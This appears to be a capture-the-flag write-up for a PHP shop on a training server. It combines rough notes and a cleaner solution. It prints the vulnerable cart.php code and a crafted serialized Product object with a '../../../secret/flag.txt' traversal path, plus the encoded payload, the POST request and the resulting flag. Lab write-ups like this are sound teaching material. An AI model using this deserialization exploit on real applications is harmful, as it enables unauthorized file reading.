first of all:
- javascript is totally on client side (but we didn't exploit it)
- look for a function that print as a string the content of a file (for instance,
file_get_contents($path) in the class Product.inc.php)
- then, you check the flow that leads to this function
file_get_contents() -> getPicture() -> toDict() -> this function is called in some php pages(ctrl+f+shift)
- other thing to notice is unserialize() which is called insiede restore() insiede the object state,
which is called in three pages to be precise: add_to_cart.php, cart.php and purchase.php
- so the idea is to craft a fake state in a way to call toDict (that will call file_get_contents)
- so we can check the previous pages and we will notice that cart.php calls restore and later
also the function toDict (but from the state and not the product!)
- basically state and product classes have the different functions but one with the same name!!
-so we just need to send a fake State class, but in reality it must be a product!
- i used an online editor for php in order to craft the class. The following code is the one used for
crafting. 
- Finally, I used postman to send the php post request at the follwoing link: http://lolshop.training.jinblack.it/api/cart.php
(notice that i check on the javascript where this function is called )
- on postman changes body -> form-data -> add field "state" and add the encoded craft
```php
<?php
class Product {

    private $id;
    private $name;
    private $description;
    private $picture;
    private $price;
    
    function __construct($id, $name, $description, $price) {
        $this->id = $id;
        $this->name = $name;
        $this->description = $description;
        $this->picture = "../../../secret/flag.txt";
        $this->price = $price;
    }
    

    function save() {
        return base64_encode(gzcompress(serialize($this)));
    }

    static function restore($token) {
        return unserialize(gzuncompress(base64_decode($token)));
    }

}
```


$prod1 = new Product(1,"name","description",1);
//echo serialize($prod1);
//echo  base64_encode(gzcompress(serialize($prod1)));

// i retrieved this flag from postman
$flag = "YWN0Znt3ZWxjb21lX3RvX3RoZV9uZXdfd2ViXzA4MzZlZWY3OTE2NmI1ZGM4Yn0K";
echo base64_decode($flag);
//print_r($prod1);

?>

## Challange
Read the flag in `/secret/flag.txt`. 
## Solution
In the source code we can see that the only function that can read a file is `getPicture()` in `Product.inc.php`. If we can alter the attribute `picture` we could inject the path `../../../secret/flag.txt` and read the content of the file through `file_get_contents`.

In `cart.php` if the isset `state` the code execute the function `toDict()` and return the result. In the normal behaviour `toDict()` is called from a `State` object but we can pass a serialized object of class `Product` which having the same method will return the content of the flag.
```php
if(isset($_REQUEST['token'])) {

    $state = $db->retrieveState($_REQUEST['token']);
    if(!$state) {
        http_response_code(400);
    } else {
        echo $state;
    }

} else if(isset($_REQUEST['state'])) {

    $state = State::restore($_REQUEST['state']);

    $enc = json_encode($state->toDict(), JSON_PRETTY_PRINT | JSON_NUMERIC_CHECK);

    if(isset($_REQUEST['save'])) {
        $tok = $db->saveState($enc);
        if(!$tok) {
            http_response_code(400);
        } else {
            echo json_encode(array("token" => $tok));
        }
    } else {
        echo $enc;
    }

} else {
    http_response_code(400);
}

?>
```
Supposing we can pass an altered `$_REQUEST['state']` the method `State::restore` does:
```php
static function restore($token) {
    return unserialize(gzuncompress(base64_decode($token)));
}
```
By crafting and executing this php code we can obtain a string which will return an object of class `Product` after being unserialized by `restore` method.
```php
<?php

class Product {

    private $id;
    private $name;
    private $description;
    private $picture = "../../../secret/flag.txt";
    private $price;
}

$r = new Product();
echo base64_encode(gzcompress(serialize($r)));

?>
```
By using Postman, send a POST request to `http://lolshop.training.jinblack.it/api/cart.php` with body of type form-data and parameter `state` `eJzztzK3Ugooyk8pTS5RsjK1qi62MjS0UmKACjFkpihZ+1kDBY2RBPMSc1MhwkYGSMIpqcXJRZkFJZn5eVBNZkiyBZnJJaVFQH1AXSZWSnp6+hBUnJpclFqin5aTmK5XUlECkjc0QdZXlJkMtq0WAJiQNKc=`.
This way after being restore, the method toDict() will be executed in the class Product and will return a JSON with this format:
```JSON
{
    "id": null,
    "name": null,
    "description": null,
    "picture": "YWN0Znt3ZWxjb21lX3RvX3RoZV9uZXdfd2ViXzA4MzZlZWY3OTE2NmI1ZGM4Yn0K",
    "price": null
}
```
`picture` is the base64 version of the content of the flag, by doing the decode64 we obtain the flag.

